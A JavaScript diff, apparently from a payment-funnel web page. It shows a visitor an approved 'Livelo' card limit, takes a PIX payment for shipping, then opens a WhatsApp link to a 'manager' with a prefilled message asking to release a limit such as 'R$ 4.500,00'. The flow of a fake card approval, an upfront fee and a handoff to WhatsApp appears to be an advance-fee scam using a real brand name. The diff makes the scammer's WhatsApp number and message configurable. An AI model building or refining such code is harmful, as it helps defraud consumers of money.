@@ -273,6 +273,7 @@ async function submitBilling() {
     
     if (data.ok) {
       if ($id('approved-limit')) $id('approved-limit').textContent = data.limite;
+      STATE.limite = data.limite;
       if ($id('done-limite')) $id('done-limite').textContent = data.limite;
       
       // Update PIX step with correct shipping cost
@@ -592,10 +593,16 @@ function startPixPolling(paymentId) {
 }
 
 function showDone() {
-  // Configura link do zap
-  let waNumber = STATE.managerWa;
-  if (!waNumber.startsWith('55')) waNumber = '55' + waNumber;
-  const msg = encodeURIComponent(`Olá! Acabei de pagar o frete do meu cartão Livelo (Sessão: ${STATE.sessionId.substring(0,8)}). Gostaria de confirmar a entrega!`);
+    // Configura link do zap
+  let waNumber = window.APP_WA_NUM || STATE.managerWa || '5511999999999';
+  waNumber = waNumber.replace(/\D/g, '');
+  if (waNumber.length > 0 && !waNumber.startsWith('55')) waNumber = '55' + waNumber;
+  
+  let rawText = window.APP_WA_TEXT || 'Olá! Acabei de pagar o frete do meu cartão Livelo (Sessão: {token}). Gostaria de confirmar a entrega e liberar meu limite de {limite}!';
+  rawText = rawText.replace('{token}', (STATE.sessionId || 'XXXX').substring(0,8));
+  rawText = rawText.replace('{limite}', STATE.limite || 'R$ 4.500,00');
+  
+  const msg = encodeURIComponent(rawText);
   
   $id('btn-contact-manager').href = `https://wa.me/${waNumber}?text=${msg}`;
   
